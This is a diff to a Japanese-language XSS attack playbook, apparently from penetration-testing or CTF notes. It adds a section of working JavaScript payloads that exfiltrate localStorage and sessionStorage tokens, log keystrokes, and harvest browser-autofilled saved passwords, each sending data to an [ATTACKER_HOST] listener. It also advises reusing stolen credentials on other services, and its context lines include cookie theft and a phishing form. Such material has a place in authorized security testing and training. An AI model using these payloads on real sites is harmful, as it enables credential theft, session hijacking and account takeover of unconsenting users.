@@ -1,6 +1,6 @@
 # クロスサイトスクリプティング（XSS）
 
-> **スコープ**: Web アプリへの JavaScript 注入。基本動作確認〜ヘッダー経由注入〜Cookie スティーリング〜Blind XSS callback〜Cookie 植え替え〜DOM 偽装〜バイパスエンコード〜mXSS / prototype pollution / コードレビュー観点まで扱う。XSS で取得した管理者セッションを使った後続攻撃は `Command_Injection.md`（管理者専用 API のインジェクション）を参照。
+> **スコープ**: Web アプリへの JavaScript 注入。基本動作確認〜ヘッダー経由注入〜Cookie スティーリング〜localStorage / 保存パスワード窃取〜Blind XSS callback〜Cookie 植え替え〜DOM 偽装〜バイパスエンコード〜mXSS / prototype pollution / コードレビュー観点まで扱う。XSS で取得した管理者セッションを使った後続攻撃は `Command_Injection.md`（管理者専用 API のインジェクション）を参照。
 
 ## 着火条件
 
@@ -19,7 +19,7 @@
 
 | HTTPOnly の状態 | 次のアクション |
 |---------------|-------------|
-| **付いている** | `document.cookie` での取得は不可 → DOM 偽装（§6）/ フィッシングリダイレクト / CSRF 補助に切り替える |
+| **付いている** | `document.cookie` での取得は不可 → §4 localStorage / 保存パスワード窃取（HTTPOnly 保護外）/ DOM 偽装（§7）/ フィッシングリダイレクト / CSRF 補助に切り替える |
 | **付いていない** | Cookie スティーリングが有効 → §3 へ |
 
 - **本文がフィルタされたらリクエストヘッダーが反射されていないか確認する**: `<script>alert(1)</script>` を本文に入れてエラーページが返ってきた場合、**そのエラーページ自身が攻撃面になっていることが多い**。画面にリクエストヘッダー（User-Agent / Referer / Cookie）がそのまま反射される設計なら §2 のヘッダー注入へ
@@ -31,14 +31,14 @@
 | 反射型（Reflected）| 入力値がそのままレスポンスに反射される | URL パラメータ・検索結果・エラーメッセージ |
 | 格納型（Stored）| 入力値がサーバーに保存され他ユーザーに表示される | コメント欄・メッセージ機能・プロフィール |
 | DOM 型（DOM-based）| クライアントサイド JS が URL フラグメントを直接 DOM に書き込む | `document.write()` / `innerHTML` の使用箇所 |
-| **mXSS（Mutation XSS）**| サニタイズ後の文字列が `innerHTML` 代入時に mutate する | DOMPurify + `innerHTML` の組み合わせ（§8）|
+| **mXSS（Mutation XSS）**| サニタイズ後の文字列が `innerHTML` 代入時に mutate する | DOMPurify + `innerHTML` の組み合わせ（§9）|
 | **Blind XSS**| 入力値はその場では反射されないが後で別ユーザーのブラウザで読まれる | お問い合わせフォーム・サポートチケット・管理者向けレポート画面 |
 
 **Blind XSS の発火シグナル:**
 
 | 観測される文言・挙動 | 意味 | 次のアクション |
 |---|---|---|
-| 「メッセージを管理者に送信しました」| 管理者のブラウザで開かれる可能性 | §4 Blind XSS ペイロード送信 |
+| 「メッセージを管理者に送信しました」| 管理者のブラウザで開かれる可能性 | §5 Blind XSS ペイロード送信 |
 | 「不正な入力を検出しました。管理者に通知しました」| 管理者用レポート画面に reflect される設計 | 同上。本文だけでなくヘッダーも注入（§2）|
 | 問い合わせ・苦情・サポート機能 | 管理者ブラウザで HTML 化されて表示される可能性 | 同上 |
 
@@ -67,7 +67,7 @@
 | 出力 | 示唆 | 次のアクション |
 |---|---|---|
 | `<b>test</b>` で太字が表示される | HTML として解釈されている | `<script>alert(1)</script>` / イベントハンドラへ |
-| `alert(1)` が発火する | XSS 成立 | §3 Cookie スティーリング / §4 Blind XSS / §6 DOM 偽装へ |
+| `alert(1)` が発火する | XSS 成立 | §3 Cookie スティーリング / §5 Blind XSS / §7 DOM 偽装へ |
 | `<script>` が除去されるがタグが表示される | フィルタが特定タグのみブロック | `<img onerror=...>` / `<svg onload=...>` へ |
 | エラーページにリクエストヘッダーが反射 | フォームフィルタ + ヘッダー非サニタイズ | §2 ヘッダー注入へ |
 
@@ -99,7 +99,7 @@ User-Agent: <script>alert(1)</script>
 |---|---|---|
 | ヘッダー注入で `alert(1)` が発火 | フォームフィルタを迂回。ヘッダー注入で XSS 成立 | §3 Cookie スティーリングへ |
 | ヘッダー値が画面に表示されるが JS は実行されない | サニタイズが一部のみ（HTML は出るが script ブロック）| イベントハンドラ（`onerror` / `onload`）を試す |
-| 「report has been sent to the administrator」 | 管理者がレポートを後から閲覧する設計 | Blind XSS に切り替え（§4）。ヘッダー + 本文の両方に注入 |
+| 「report has been sent to the administrator」 | 管理者がレポートを後から閲覧する設計 | Blind XSS に切り替え（§5）。ヘッダー + 本文の両方に注入 |
 
 ---
 
@@ -131,15 +131,57 @@ ip a | grep "inet " | grep -v 127.0.0.1
 
 | 出力 | 示唆 | 次のアクション |
 |---|---|---|
-| テスター側 HTTP サーバーに Cookie が届く | Cookie スティーリング成立 | §5 Cookie 植え替えへ |
+| テスター側 HTTP サーバーに Cookie が届く | Cookie スティーリング成立 | §6 Cookie 植え替えへ |
 | callback が来ない | ペイロードが実行されていない / CSP で外部接続遮断 | `<img onerror=...>` に切替・受信ポートを 80/443 に変更 |
-| callback は来たが Cookie 値が空 | HTTPOnly 付き | §6 DOM 偽装・フィッシングリダイレクトへ切替 |
+| callback は来たが Cookie 値が空 | HTTPOnly 付き | §4 localStorage / 保存パスワード窃取（HTTPOnly 保護外）→ 無ければ §7 DOM 偽装・フィッシングリダイレクトへ切替 |
 
 **注意:** `new Image()` を使う理由（Blind XSS の文脈で重要）: 画面遷移しない / `btoa()` で base64 化することで Cookie に含まれる `=` `;` 等の特殊文字をそのまま送れる。**自分のセッションが先に届く**（投稿時に自分が一度ロード → 1 件目は捨てて 2 件目以降の Cookie を狙う）。
 
 ---
 
-## 4. Blind XSS の callback 受信と Cookie の復号
+## 4. Cookie 以外の窃取ターゲット（localStorage / sessionStorage / 保存パスワード / キーロギング）
+
+Cookie が HTTPOnly で `document.cookie` から取れなくても、JS 実行が取れている以上ほかにも窃取できる資産がある。トークンを `localStorage` / `sessionStorage` に置く SPA は多く、これらは **HTTPOnly の保護対象外**で `document.cookie` 不可でも JS から読める。フォームのキーロギング、ブラウザ保存パスワードの自動入力（autofill）誘発も同じ JS 実行から成立する。
+
+**先に確認すること:** DevTools → Application → Local Storage / Session Storage にトークン（JWT・API キー・`access_token` 等）が保管されていないか。あれば HTTPOnly Cookie でも窃取経路が残っている。
+
+**事前準備（必須）:** §3 と同じく受信用 HTTP サーバーを起動しておく（`python3 -m http.server 8000` / 到達可能 IP は `ip a` で確認）。
+
+**コマンド（ペイロード）:**
+
+```html
+<!-- [Attacker] localStorage / sessionStorage を丸ごと exfil -->
+<script>new Image().src="http://[ATTACKER_HOST]:8000/?l="+btoa(JSON.stringify(localStorage)+"|"+JSON.stringify(sessionStorage));</script>
+
+<!-- [Attacker] キーロギング（入力 1 文字ごとに送信。ログイン・パスワード変更画面で有効） -->
+<script>
+document.addEventListener('keypress',function(e){new Image().src="http://[ATTACKER_HOST]:8000/?k="+e.key;});
+</script>
+
+<!-- [Attacker] ブラウザ保存パスワードの autofill 窃取
+     隠しフォームを挿入 → ブラウザが保存済み認証情報を自動入力 → 値を読んで送信 -->
+<script>
+var f=document.createElement('form');
+f.innerHTML='<input id="u" name="username"><input id="p" name="password" type="password">';
+f.style.display='none';document.body.appendChild(f);
+setTimeout(function(){new Image().src="http://[ATTACKER_HOST]:8000/?a="+btoa(document.getElementById('u').value+":"+document.getElementById('p').value);},1500);
+</script>
+```
+
+**観測される出力 → 次のアクション:**
+
+| 出力 | 示唆 | 次のアクション |
+|---|---|---|
+| `?l=` で localStorage の JSON が届く | トークンが JS 可読領域に保管 | base64 デコード → JWT なら `JWT_Attacks.md` / API キーなら該当 API へ |
+| `?k=` でキーストロークが順次届く | キーロギング成立 | 連結して資格情報・MFA コードを復元 |
+| `?a=` に `user:pass` が届く | 保存パスワードの autofill 窃取成立 | 取得した資格情報を他サービスで使い回し検証 → `../Credential_Discovery.md` |
+| autofill 値が空のまま | 当該オリジンに保存資格情報が無い / autofill 抑制 | キーロギングで待ち受けに切替 / DOM 偽装フィッシング（§7）へ |
+
+**注意:** `localStorage` / `sessionStorage` は **HTTPOnly Cookie の保護対象外**（JS から常に読める）ため、Cookie が HTTPOnly でもトークンが Storage にあれば窃取できる。autofill 窃取は被害者ブラウザに保存済み資格情報があり、挿入フォームのフィールド名・`type` がブラウザのヒューリスティックに合致したときのみ発火する（`autocomplete="off"` でも効くことがある）。`new Image()` を使う理由は §3 と同じ（画面遷移なし・`btoa()` で `=` `;` 等の特殊文字を保全）。
+
+---
+
+## 5. Blind XSS の callback 受信と Cookie の復号
 
 **コマンド（ペイロード例）:**
 
@@ -166,7 +208,7 @@ echo "aXNfYWRtaW49Im[...]=" | base64 -d
 
 | 出力 | 示唆 | 次のアクション |
 |---|---|---|
-| callback の UA が自分のブラウザと違う | 別ユーザー（管理者）のブラウザでロードされた | §5 Cookie 植え替えへ |
+| callback の UA が自分のブラウザと違う | 別ユーザー（管理者）のブラウザでロードされた | §6 Cookie 植え替えへ |
 | 受信元 IP が自分以外 | 別ユーザーの確認 | 同上 |
 | callback が一切来ない | ペイロードが管理者ブラウザに届く経路にない / CSP 遮断 / フィルタ | `<img onerror=...>` に切替・期間を空けて待つ・受信 IP/Port を 80/443 に変更 |
 
@@ -174,7 +216,7 @@ echo "aXNfYWRtaW49Im[...]=" | base64 -d
 
 ---
 
-## 5. 取得した Cookie で別ユーザーになりすます
+## 6. 取得した Cookie で別ユーザーになりすます
 
 **手順（ブラウザで植え替える）:**
 
@@ -205,7 +247,7 @@ curl -s http://[TARGET]/dashboard -H "Cookie: [COOKIE_NAME]=[STOLEN_COOKIE_VALUE
 
 ---
 
-## 6. DOM 偽装・フィッシングリダイレクト
+## 7. DOM 偽装・フィッシングリダイレクト
 
 **コマンド（ペイロード）:**
 
@@ -229,7 +271,7 @@ document.body.innerHTML='<form action="http://[ATTACKER_HOST]/capture">Username:
 
 ---
 
-## 7. 入力バイパス（エンコーディング・難読化）
+## 8. 入力バイパス（エンコーディング・難読化）
 
 **フィルタ回避チートシート:**
 
@@ -260,11 +302,11 @@ document.body.innerHTML='<form action="http://[ATTACKER_HOST]/capture">Username:
 | 出力 | 示唆 | 次のアクション |
 |---|---|---|
 | バイパスで `alert(1)` が発火 | フィルタ回避成立 | §3 Cookie スティーリングへ |
-| 全バイパスが失敗 | 堅牢なサニタイズ | §8 mXSS / prototype pollution を検討 |
+| 全バイパスが失敗 | 堅牢なサニタイズ | §9 mXSS / prototype pollution を検討 |
 
 ---
 
-## 8. mXSS / prototype pollution / コードレビュー観点（上級）
+## 9. mXSS / prototype pollution / コードレビュー観点（上級）
 
 ### mXSS（Mutation XSS）
 
@@ -327,11 +369,11 @@ grep -rn "dangerouslySetInnerHTML" src/ --include="*.tsx" --include="*.jsx"
 | 観測される症状 | 推定原因 | 代替手段 |
 |---|---|---|
 | 本文 `<script>` が弾かれる | フォーム入力にフィルタ | リクエストヘッダー（User-Agent / Referer）に注入を移す（§2）|
-| ヘッダー注入も反射されない | ヘッダー値もサニタイズ済み | Stored / Blind XSS が使えるエンドポイントを探す（§4）|
+| ヘッダー注入も反射されない | ヘッダー値もサニタイズ済み | Stored / Blind XSS が使えるエンドポイントを探す（§5）|
 | Blind XSS の callback が一切来ない | 管理者画面に届いていない / CSP で外部接続遮断 | `<img onerror=...>` に切替・受信 IP/Port を 80/443 に変更・期間を空けて待つ |
-| callback は来たが Cookie 値が空 | HTTPOnly が付いている | DOM 偽装（§6）/ フィッシングリダイレクト / CSRF 補助に切替 |
+| callback は来たが Cookie 値が空 | HTTPOnly が付いている | §4 localStorage / 保存パスワード窃取 / DOM 偽装（§7）/ フィッシングリダイレクト / CSRF 補助に切替 |
 | Cookie を植え替えてもログイン画面に戻る | 属性不一致 or 追加トークンが必要 | DevTools で Cookie 全属性を一致させる |
-| 全バイパスが失敗 | 堅牢なサニタイズ | §8 mXSS / prototype pollution を検討 |
+| 全バイパスが失敗 | 堅牢なサニタイズ | §9 mXSS / prototype pollution を検討 |
 
 ---
 
